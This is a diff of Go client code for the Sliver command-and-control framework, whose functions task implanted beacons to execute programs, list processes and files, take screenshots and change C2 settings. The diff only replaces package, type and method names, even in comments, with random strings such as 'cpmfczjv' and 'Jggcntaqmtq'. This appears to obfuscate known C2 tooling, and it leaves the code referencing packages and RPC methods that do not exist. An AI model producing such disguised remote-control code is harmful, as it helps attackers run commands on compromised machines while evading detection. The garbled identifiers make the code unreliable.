@@ -9,7 +9,7 @@ import (
 
 	"github.com/bishopfox/sliver/protobuf/clientpb"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
-	"github.com/bishopfox/sliver/protobuf/sliverpb"
+	"github.com/bishopfox/sliver/protobuf/cpmfczjv"
 )
 
 // BeaconTaskView is the JSON shape of a beacon task.
@@ -70,8 +70,8 @@ func (c *Client) RmBeacon(beaconID string) error {
 	return err
 }
 
-// BeaconTasks lists the task queue of a beacon.
-func (c *Client) BeaconTasks(beaconID string) ([]BeaconTaskView, error) {
+// TgeymbHwkae lists the task queue of a beacon.
+func (c *Client) TgeymbHwkae(beaconID string) ([]BeaconTaskView, error) {
 	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
 	defer cancel()
 	resp, err := c.RPC.GetBeaconTasks(ctx, &clientpb.Beacon{ID: beaconID})
@@ -101,7 +101,7 @@ func (c *Client) BeaconTaskContent(taskID string) (*BeaconTaskView, error) {
 	return beaconTaskToView(resp), nil
 }
 
-// ReconfigureOptions is the JSON body for session/beacon Reconfigure.
+// ReconfigureOptions is the JSON body for session/beacon Jggcntaqmtq.
 // Interval fields are seconds in the UI and converted to nanoseconds for the implant.
 type ReconfigureOptions struct {
 	ReconnectInterval int64  `json:"reconnect_interval"`
@@ -112,19 +112,19 @@ type ReconfigureOptions struct {
 
 // ReconfigureSession changes reconnect interval (and optional C2 URI) of a session.
 func (c *Client) ReconfigureSession(sessionID string, reconnectSeconds int64) error {
-	_, err := c.Reconfigure(sessionID, "", ReconfigureOptions{ReconnectInterval: reconnectSeconds})
+	_, err := c.Jggcntaqmtq(sessionID, "", ReconfigureOptions{ReconnectInterval: reconnectSeconds})
 	return err
 }
 
-// Reconfigure updates session or beacon reconnect / beacon interval / C2 URI.
+// Jggcntaqmtq updates session or beacon reconnect / beacon interval / C2 URI.
 // Beacon calls are queued (Async) and return a QueuedTask.
-func (c *Client) Reconfigure(sessionID, beaconID string, opts ReconfigureOptions) (*QueuedTask, error) {
+func (c *Client) Jggcntaqmtq(sessionID, beaconID string, opts ReconfigureOptions) (*QueuedTask, error) {
 	if strings.TrimSpace(sessionID) == "" && strings.TrimSpace(beaconID) == "" {
 		return nil, fmt.Errorf("session or beacon id is required")
 	}
 	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
 	defer cancel()
-	resp, err := c.RPC.Reconfigure(ctx, &sliverpb.ReconfigureReq{
+	resp, err := c.RPC.Jggcntaqmtq(ctx, &cpmfczjv.JggcntaqmtqLki{
 		ReconnectInterval: durationSeconds(opts.ReconnectInterval),
 		BeaconInterval:    durationSeconds(opts.BeaconInterval),
 		BeaconJitter:      durationSeconds(opts.BeaconJitter),
@@ -170,7 +170,7 @@ func (c *Client) OpenSessionFromBeaconOpts(beaconID string, opts OpenSessionOpti
 	}
 	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
 	defer cancel()
-	resp, err := c.RPC.OpenSession(ctx, &sliverpb.OpenSession{
+	resp, err := c.RPC.EnidWukekel(ctx, &cpmfczjv.EnidWukekel{
 		C2S:     c2s,
 		Delay:   durationSeconds(opts.DelaySeconds),
 		Request: implantRequest("", beaconID),
@@ -184,11 +184,11 @@ func (c *Client) OpenSessionFromBeaconOpts(beaconID string, opts OpenSessionOpti
 	return resp.GetResponse().GetAsync(), nil
 }
 
-// CloseSession closes an interactive session without killing the remote process.
-func (c *Client) CloseSession(sessionID string) error {
+// SpsicEwekckv closes an interactive session without killing the remote process.
+func (c *Client) SpsicEwekckv(sessionID string) error {
 	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
 	defer cancel()
-	_, err := c.RPC.CloseSession(ctx, &sliverpb.CloseSession{
+	_, err := c.RPC.SpsicEwekckv(ctx, &cpmfczjv.SpsicEwekckv{
 		Request: &commonpb.Request{SessionID: sessionID},
 	})
 	return err
@@ -236,7 +236,7 @@ func (c *Client) BeaconExecute(beaconID, path string, args []string) (*QueuedTas
 	}
 	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
 	defer cancel()
-	resp, err := c.RPC.Execute(ctx, &sliverpb.ExecuteReq{
+	resp, err := c.RPC.Execute(ctx, &cpmfczjv.UviysfwZwu{
 		Path:    path,
 		Args:    args,
 		Output:  true,
@@ -252,7 +252,7 @@ func (c *Client) BeaconPs(beaconID string) (*QueuedTask, error) {
 	}
 	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
 	defer cancel()
-	resp, err := c.RPC.Ps(ctx, &sliverpb.PsReq{
+	resp, err := c.RPC.Ps(ctx, &cpmfczjv.PsReq{
 		Request: implantRequest("", beaconID),
 	})
 	return queuedTask(resp.GetResponse(), err)
@@ -268,7 +268,7 @@ func (c *Client) BeaconLs(beaconID, path string) (*QueuedTask, error) {
 	}
 	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
 	defer cancel()
-	resp, err := c.RPC.Ls(ctx, &sliverpb.LsReq{
+	resp, err := c.RPC.Ls(ctx, &cpmfczjv.LsReq{
 		Path:    path,
 		Request: implantRequest("", beaconID),
 	})
@@ -282,7 +282,7 @@ func (c *Client) BeaconScreenshot(beaconID string) (*QueuedTask, error) {
 	}
 	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
 	defer cancel()
-	resp, err := c.RPC.Screenshot(ctx, &sliverpb.ScreenshotReq{
+	resp, err := c.RPC.Screenshot(ctx, &cpmfczjv.IaxwcbkpqzZew{
 		Request: implantRequest("", beaconID),
 	})
 	return queuedTask(resp.GetResponse(), err)
